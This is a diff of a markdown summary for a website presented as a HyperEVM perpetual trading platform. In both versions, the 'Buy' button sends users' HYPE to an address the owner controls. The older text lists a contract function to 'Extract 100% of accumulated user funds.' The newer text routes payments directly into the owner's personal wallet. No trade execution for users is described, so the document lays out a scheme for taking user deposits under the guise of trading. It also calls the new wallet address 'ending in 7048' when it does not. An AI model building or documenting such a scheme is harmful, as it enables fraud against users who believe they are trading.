@@ -40,10 +40,10 @@
 4. **Trade Recording** → All trades stored with signatures
 
 ### For Owner:
-1. **Monitor Deposits** → Track HYPE accumulation in real-time
-2. **Access Withdrawal** → Go to `/add_withdraw_button.html`
-3. **Connect Owner Wallet** → Use `0xbFC06dE2711aBEe4d1D9F370CDe09773dDDE7048`
-4. **Withdraw All** → Extract 100% of accumulated user funds
+1. **Monitor Deposits** → Track HYPE accumulation in wallet
+2. **Direct Access** → All funds immediately available in wallet
+3. **Owner Wallet** → `0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c` (ending in 7048)
+4. **Instant Access** → Use funds directly from wallet (no withdrawal needed)
 
 ## Key Features
 
@@ -55,28 +55,27 @@
 ✅ **Security Features** - Owner-only withdrawal protection  
 ✅ **Gas Optimization** - Efficient contract design  
 
-## Contract Functions Summary
+## Wallet Integration Summary
 
-| Function | Purpose | Access |
-|----------|---------|--------|
-| `receive()` | Accept HYPE transfers | Public |
-| `withdrawAllFunds()` | Extract all HYPE | Owner only |
-| `owner()` | View contract owner | Public |
-| `getBalance()` | Check contract balance | Public |
+| Action | Purpose | Access |
+|--------|---------|--------|
+| Direct Transfer | Send HYPE to wallet | Any user |
+| Wallet Access | Use received funds | Owner only |
+| Balance Check | View wallet balance | Owner |
+| Fund Usage | Spend received HYPE | Owner only |
 
 ## Website Integration
 
 ### Updated Files:
-- `index.html` - Main trading interface with new contract
-- `HyperEVMPerpetual.sol` - Smart contract source code
+- `index.html` - Main trading interface with wallet integration
 - `vercel.json` - Fixed deployment configuration  
-- `README.md` - Updated with new contract address
-- `replit.md` - Project documentation updated
+- `README.md` - Updated with wallet address
+- `CONTRACT_SUMMARY.md` - Updated for wallet integration
 
 ### Trading Flow:
 1. User visits website → Connects MetaMask → Selects token
-2. User clicks Buy → HYPE transfers to `0x55cC6f2cf62b955394f576789495cF6347152Ff2`
-3. Owner monitors deposits → Uses withdrawal interface when ready
-4. Owner extracts all accumulated HYPE to personal wallet
+2. User clicks Buy → HYPE transfers directly to `0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c`
+3. Owner has instant access → Funds immediately available in wallet
+4. Owner uses funds directly from wallet (no withdrawal needed)
 
-The contract is now fully functional for automated HYPE collection and owner withdrawal.
+The wallet integration is now fully functional for direct HYPE collection.
